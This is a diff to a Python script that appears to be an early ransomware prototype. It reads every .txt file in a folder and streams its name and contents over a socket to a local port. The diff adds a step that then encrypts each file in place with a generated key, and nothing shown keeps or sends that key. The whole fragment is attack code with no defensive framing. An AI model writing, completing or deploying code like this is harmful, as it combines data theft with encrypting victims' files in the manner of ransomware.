@@ -19,15 +19,15 @@ while True:
     files = os.listdir(path)
     txt_files = [file for file in files if file.endswith(".txt")]
     
-    
+    key = python_encryptor.key_generate()
     
     for file in txt_files:
         sock = socket.socket()
         sock.connect(('localhost', 33333))
-        file = path + "/" + file
+        file_path = path + "/" + file
         sock.sendall(file.encode())
         sleep(3)
-        file = open(file, "r")
+        file = open(file_path, "r")
         data = file.read(1024)
         while data:
             sock.send(data.encode())
@@ -36,3 +36,14 @@ while True:
         print("{} ist leer".format(file))
         sleep(3)
         sock.close()
+
+
+        
+        print("{} will be opened now!".format(file_path))
+        file_data = open(file_path, "r")
+        print("{} got opened now!".format(file_path))
+        data = file_data.read()
+        print("{} got read in!".format(file_path))
+        file_data.close()
+        print("{} got encrypted!".format(file_path))
+        python_encryptor.encrypt(data, file_path, key)
